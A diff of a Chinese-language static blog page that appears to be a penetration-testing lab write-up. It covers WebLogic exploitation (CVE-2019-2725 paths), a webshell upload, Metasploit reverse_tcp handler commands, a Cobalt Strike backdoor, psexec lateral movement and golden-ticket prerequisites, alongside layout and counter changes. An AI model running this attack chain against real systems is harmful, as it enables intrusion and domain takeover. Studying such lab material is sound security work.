@@ -108,7 +108,7 @@
   </style>
 </noscript>
 
-</head>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage">
   <div class="container use-motion">
@@ -151,17 +151,17 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">3</span></a>
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">6</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">3</span></a>
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">5</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">6</span></a>
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">11</span></a>
 
   </li>
   </ul>
@@ -258,14 +258,19 @@
 <p>开放了HTTP服务、SQL Server服务、Weblogic服务</p>
 <p>对PC服务器扫描端口开启了Mysql服务</p>
 <p>对WEB服务器使用weblogic的漏洞路径进行验证，发现存在weblogic漏洞</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="regexp">/wls-wsat/</span>CoordinatorPortType</span><br><span class="line"><span class="number">2</span>.<span class="regexp">/wls-wsat/</span>CoordinatorPortType11</span><br><span class="line"><span class="regexp">/_async/</span>AsyncResponseService</span><br></pre></td></tr></table></figure>
-
+<pre><code>1./wls-wsat/CoordinatorPortType
+2./wls-wsat/CoordinatorPortType11
+/_async/AsyncResponseService
+</code></pre>
 <p>使用CVE-2019-2725对Weblogic页面进行测试，尝试之后使用MSF连接不了，才明白MSF攻击目标为Unix</p>
 <p>拿JAVA反序列化工具上传Webshell</p>
 <p><img src="https://s2.loli.net/2022/10/06/kl7SyBDeq6iZW9p.png" alt="image.png"></p>
 <p>冰蝎派生会话给MSF</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.use exploit/multi/handler</span><br><span class="line">2.<span class="built_in">set</span> payload java/meterpreter/reverse_tcp</span><br><span class="line">3.<span class="built_in">set</span> lhost 192.168.50.246</span><br><span class="line">4.<span class="built_in">set</span> lport 4444</span><br></pre></td></tr></table></figure>
-
+<pre><code>1.use exploit/multi/handler
+2.set payload java/meterpreter/reverse_tcp
+3.set lhost 192.168.50.246
+4.set lport 4444
+</code></pre>
 <p>并通过MSF上传CS生成的后门</p>
 <p><img src="https://s2.loli.net/2022/10/06/9nj8HuavRIP1F6V.png" alt="image.png"></p>
 <p>并且在CS上监听后门的端口5555</p>
@@ -310,13 +315,14 @@
 <p><img src="https://s2.loli.net/2022/10/06/1Zdhv2sXF3fW6PC.png" alt="image.png"></p>
 <p>同理，使用psexc将PC上线</p>
 <h2 id="黄金票据制作（未成功）"><a href="#黄金票据制作（未成功）" class="headerlink" title="黄金票据制作（未成功）"></a>黄金票据制作（未成功）</h2><p>黄金票据</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心（KDC）证明用户已被其他域控制器认证。可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限</span><br></pre></td></tr></table></figure>
-
+<pre><code>黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心（KDC）证明用户已被其他域控制器认证。可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限
+</code></pre>
 <p>前提条件</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.域名称</span><br><span class="line">2.域的SID值</span><br><span class="line">3.域的KRBTGT账户NTLM密码哈希</span><br><span class="line">4.伪造用户名</span><br></pre></td></tr></table></figure>
-
-
-
+<pre><code>1.域名称
+2.域的SID值
+3.域的KRBTGT账户NTLM密码哈希
+4.伪造用户名
+</code></pre>
 <p>获得KRBTGT账户NTLM密码哈希</p>
 <p><img src="https://s2.loli.net/2022/10/06/howdO7kiAvpb6ft.png" alt="image.png"></p>
 <p>获取SID</p>
@@ -384,7 +390,10 @@
     <a href="/2022/10/05/%E6%97%A5%E8%AE%B0-20221005/" rel="prev" title="2022/10/05">
       <i class="fa fa-chevron-left"></i> 2022/10/05
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2022/10/10/CTFSHOW-sql/" rel="next" title="SQL注入">
+      SQL注入 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -457,20 +466,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
